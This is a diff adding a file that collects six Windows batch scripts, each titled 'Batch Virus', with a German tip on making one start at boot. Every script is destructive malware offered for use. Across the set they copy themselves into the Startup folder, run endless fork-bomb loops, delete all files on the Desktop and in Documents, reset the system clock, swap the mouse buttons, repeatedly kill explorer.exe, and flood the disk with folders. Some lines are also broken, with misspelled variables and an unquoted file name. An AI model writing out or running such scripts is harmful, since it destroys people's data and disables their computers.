@@ -1,0 +1,142 @@
+1. Batch Virus
+
+@echo off
+copy 0% "%systemdrive%\Documents and Settings\All Users\Start Menu\Programs\Startup"
+:loop
+start
+goto :loop
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+2. Batch Virus
+
+:pi 
+start command 
+start www.redtube.com 
+dir 
+goto pi 
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+3. Batch Virus
+
+@echo off
+color b
+echo MUHAHAHA
+color e
+echo made by HackerLounge!
+PAUSE
+dir
+color a
+dir
+color b
+dir
+color c
+dir
+color d
+dir
+color e
+dir
+color f
+dir
+color 1
+dir
+color 2
+dir
+color 3
+dir
+color 4
+dir
+color 5
+dir
+color 6
+dir
+color 7
+dir
+color 8
+dir
+color 9
+tree
+color a
+tree
+color b
+tree
+color c
+tree
+color d
+tree
+color e
+tree
+color f
+tree
+color 1
+tree
+color 2
+tree
+color 3
+tree
+color 4
+tree
+color 5
+tree
+color 6
+tree
+color 7
+tree
+color 8
+tree
+color 9
+
+set date=1
+time 0:00
+
+copy Batch Virus 3.bat "%userprofile%\START~1\Programs\Startup"
+
+cd %userporfile%\desktop
+For %%A IN (*.*) DO DEL %%A
+:loop
+cd %userprofile%\desktop
+md %random%
+md %random%
+md %random%
+goto loop
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+4. Batch Virus
+
+@echo off
+
+Rundll32 user32 , SwapMouseButton
+
+copy virus.bat "%userprofile%\STARTM~1\Programs\Startup"
+
+set date=1
+time 0:00
+
+cd %userprofile%\desktop
+FOR %%A IN (*.*) DO DEL %%A
+
+cd %userprofile%\documents
+FOR %%A IN (*.*) DO DEL %%A
+
+cd %userprofile%\desktop
+:loop
+md %random%
+goto loop
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+5. Batch Virus (Hier kann man auch den Befehl mit dem Startup-Ordner rein packen - kopiert ihn von oben nach dem @echo off wenn ihr wollt, damit dieser Virus sich immer beim Hochfahren startet)
+
+@echo off
+:start
+taskkill /IM explorer.exe /f
+start virus
+goto start
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+6. Batch Virus
+
+set dirBas=Virus
+set loopEnd=1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+set loopRun=0
+:dirLoop
+set /a loopRun=%loopRun%+1
+mkdir "%dirBas% Nummer %loopRun%"
+if %loopRun% EQU  %loopEnd% goto dirLoopEnd
+goto dirLoop
+Exit
+:dirLoopEnd
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
